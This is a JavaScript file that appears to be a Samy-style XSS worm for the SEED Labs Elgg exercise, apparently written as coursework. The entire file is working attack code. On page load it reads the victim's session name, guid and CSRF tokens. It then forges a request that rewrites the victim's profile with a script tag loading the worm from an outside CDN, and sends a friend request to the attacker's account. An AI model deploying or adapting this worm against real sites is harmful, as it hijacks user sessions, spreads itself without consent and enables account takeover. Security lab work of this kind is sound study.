window.onload = function(){
    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    //and Security Token __elgg_token
    var userName="&name="+elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    //Set the victims About me to the worm
    var content=token+ts+userName+'&description=<script src="https://cdn.jsdelivr.net/gh/kakp0/CYBR271-XSS/WORM-V3.js"></script>'+guid; 
    var samyGuid=59; 
    var sendurl="http://www.seed-server.com/action/profile/edit"; 
    if(elgg.session.user.guid!=samyGuid) 
    {
        //Create and send Ajax request to modify profile
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
        Ajax.send(content);
    }

    //Send friend request to Samy
    var sendurl="http://www.seed-server.com/action/friends/add?friend="+samyGuid+"&__elgg_ts=1728719431"+token+ts; 
    //Create and send Ajax request to add friend
    Ajax=new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
  
}


